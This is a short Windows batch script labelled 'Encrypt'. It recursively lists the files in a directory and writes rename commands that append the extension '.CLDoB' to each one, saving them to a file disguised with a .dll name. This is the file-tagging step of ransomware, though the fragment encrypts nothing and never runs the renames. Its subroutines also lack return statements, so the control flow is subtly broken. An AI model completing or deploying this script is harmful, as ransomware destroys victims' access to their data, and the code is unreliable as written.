rem Encrypt
setlocal enableDelayedExpansion

dir /b /s /a:a > %tmp%\encrypt_list.db

for /f "delims=" %%i in (%tmp%\encrypt_list.db) do (
  call :TempFor2 "%%i"
  call :TempFor "%%~nxi"
  echo ren "!str!" "!st!" >> %tmp%\encrypt_list.dll
) 

:TempFor
  set st=%~1
  set st=%st%.CLDoB
  
 :TempFor2
  set str=%~1